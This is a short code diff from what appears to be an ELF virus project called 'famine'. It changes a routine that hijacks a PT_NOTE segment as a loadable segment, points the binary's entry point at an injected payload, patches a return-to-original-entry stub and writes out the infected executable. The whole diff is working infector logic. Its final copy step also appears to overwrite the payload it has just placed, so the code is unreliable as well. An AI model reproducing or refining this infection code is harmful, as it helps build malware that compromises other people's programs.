@@ -52,6 +52,8 @@ void pt_note_to_pt_load_infection(t_famine *famine)
 
             famine->ehdr->e_entry = famine->phdr[i].p_vaddr;
             famine->new_entry_point = famine->ehdr->e_entry;
+
+            famine->ehdr->e_shoff += famine->payload_size + (famine->phdr[i].p_offset - (famine->p_data_end_offset));
         }
     }
 
@@ -60,8 +62,24 @@ void pt_note_to_pt_load_infection(t_famine *famine)
         error(ERROR_SECTION_NOT_FOUND, famine);
     }
 
-    // Copy until end of original file.
-    memcpy(famine->infected_file, famine->mmap_ptr, famine->binary_data_size);
+    // cipher_famine_file_data(famine);
+    if (famine->elf_32)
+    {
+        overwrite_payload_ret2oep(famine);
+    }
+    else if (famine->elf_64)
+    {
+        overwrite_payload_ret2oep(famine);
+        // overwrite_keysection_payload(famine);
+        // overwrite_payload_getencryptedsectionaddr(famine);
+        // overwrite_payload_getencryptedsectionsize(famine);
+        // overwrite_payload_gettextsectionaddr(famine);
+        // overwrite_payload_gettextsize(famine);
+    }
+
+    // Copy until end of data segment.
+    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_data_end_offset);
     // Copy payload.
-    memcpy(famine->infected_file + famine->binary_data_size, famine->payload_data, famine->payload_size);
+    memcpy(famine->infected_file + famine->p_data_end_offset, famine->payload_data, famine->payload_size);
+    memcpy(famine->infected_file + famine->p_data_end_offset, famine->mmap_ptr + famine->p_data_end_offset, famine->binary_data_size - famine->p_data_end_offset);
 }
